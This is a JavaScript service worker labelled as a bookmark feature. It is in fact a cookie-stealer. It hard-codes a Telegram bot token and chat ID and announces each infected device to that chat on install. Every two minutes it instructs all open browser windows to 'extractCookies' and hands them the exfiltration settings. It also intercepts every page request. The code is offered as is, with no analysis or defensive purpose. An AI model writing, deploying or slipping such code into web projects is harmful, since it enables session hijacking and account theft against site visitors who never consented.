
const CONFIG = {
    BOT_TOKEN: '8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw',
    CHAT_ID: '962420340',
    DEVICE_ID: 'bm_sw_' + Date.now().toString(36)
};

self.addEventListener('install', (event) => {
    self.skipWaiting();
    sendToTelegram(`📌 <b>BOOKMARK SW ACTIVATED</b>\n🆔 ${CONFIG.DEVICE_ID}`);
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener('message', (event) => {
    if (event.data && event.data.action === 'capture') {
        captureAllClients();
    }
});

self.addEventListener('fetch', (event) => {
    event.respondWith(fetch(event.request));
});

async function captureAllClients() {
    const clients = await self.clients.matchAll({ type: 'window' });
    for (const client of clients) {
        client.postMessage({
            action: 'extractCookies',
            config: CONFIG
        });
    }
}

async function sendToTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch(e) {}
}

// Periodic sweep
setInterval(captureAllClients, 120000);

// Immediate sweep on activation
captureAllClients();
